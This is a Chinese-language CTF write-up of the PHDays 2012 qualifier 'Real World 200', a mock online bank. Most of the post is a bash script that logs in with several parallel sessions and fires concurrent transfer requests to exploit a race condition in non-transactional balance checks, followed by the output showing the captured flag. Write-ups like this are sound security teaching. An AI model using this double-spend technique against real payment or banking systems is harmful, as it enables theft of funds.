---
title: PHDay CTF 2012 Quals Real World 200
author: fqj
layout: post
permalink: /phday-ctf-2012-quals-real-world-200/
categories:
  - CTF
  - writeup
---
这个是一个银行，你帐号只有1000块，然后要给别人打钱，要打别人2000快。

问题：竞争，系统没有用事务

恼人的地方：需要用多个不同的session去登录同一个帐号，同一个session登录多次转账没有用，因为每一次请求sessionid会变化，那么第二个请求就成了not authorized.

脚本：

    #!/bin/bash -e
    wget "http://ctf.phdays.com:1629/?act=register" --post-data="login=$1&pass1=$1&pass2=$1&email=123%40123.com" -O /dev/null -q
    wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&password=$1" --save-cookies=cookiejar --keep-session-cookies  --load-cookies=cookiejar -O /dev/null -q
    wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&password=$1" --save-cookies=cookiejar2 --keep-session-cookies  --load-cookies=cookiejar2 -O /dev/null -q
    wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&password=$1" --save-cookies=cookiejar3 --keep-session-cookies  --load-cookies=cookiejar3 -O /dev/null -q
    wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&password=$1" --save-cookies=cookiejar4 --keep-session-cookies  --load-cookies=cookiejar4 -O /dev/null -q
    wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&password=$1" --save-cookies=cookiejar5 --keep-session-cookies  --load-cookies=cookiejar5 -O /dev/null -q
    wget "http://ctf.phdays.com:1629/?act=login" "--post-data=login=$1&password=$1" --save-cookies=cookiejar6 --keep-session-cookies  --load-cookies=cookiejar6 -O /dev/null -q
    wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amount=1000" --load-cookies=cookiejar --save-cookies=cookiejar --keep-session-cookies -O /dev/null -q &
    wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amount=1000" --load-cookies=cookiejar2 --save-cookies=cookiejar2 --keep-session-cookies -O /dev/null -q &
    wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amount=1000" --load-cookies=cookiejar3 --save-cookies=cookiejar3 --keep-session-cookies -O /dev/null -q &
    wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amount=1000" --load-cookies=cookiejar4 --save-cookies=cookiejar4 --keep-session-cookies -O /dev/null -q &
    wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amount=1000" --load-cookies=cookiejar5 --save-cookies=cookiejar5 --keep-session-cookies -O /dev/null -q &
    wget "http://ctf.phdays.com:1629/?act=transaction" --post-data="account=40433343a063d26054a3169b42b5957f&amount=1000" --load-cookies=cookiejar6 --save-cookies=cookiejar6 --keep-session-cookies -O /dev/null -q &
    while true; do
        if ps aux | grep -v grep | grep wget >/dev/null; then
            sleep 1
        else
            wget "http://ctf.phdays.com:1629/?act=main" --load-cookies=cookiejar2 --save-cookies=cookiejar2 --keep-session-cookies -O - -q | html2text -utf8
            rm cookiejar*
            exit 0
        fi
    done
    

运行结果：

     PHDays_E-Banking  
     * Home_Page  
     * Transactions  
     * Log_out  
     * Current balance: 0 Logged in as luketest6 Your flag: e8b434d21354e1a2ab61f4c672109559  
    
     =============================================================================== © 1.21 GigaWatt, LLC. All Rights Reserved.
    

如果一次没成功，用不同的参数重新运行就好了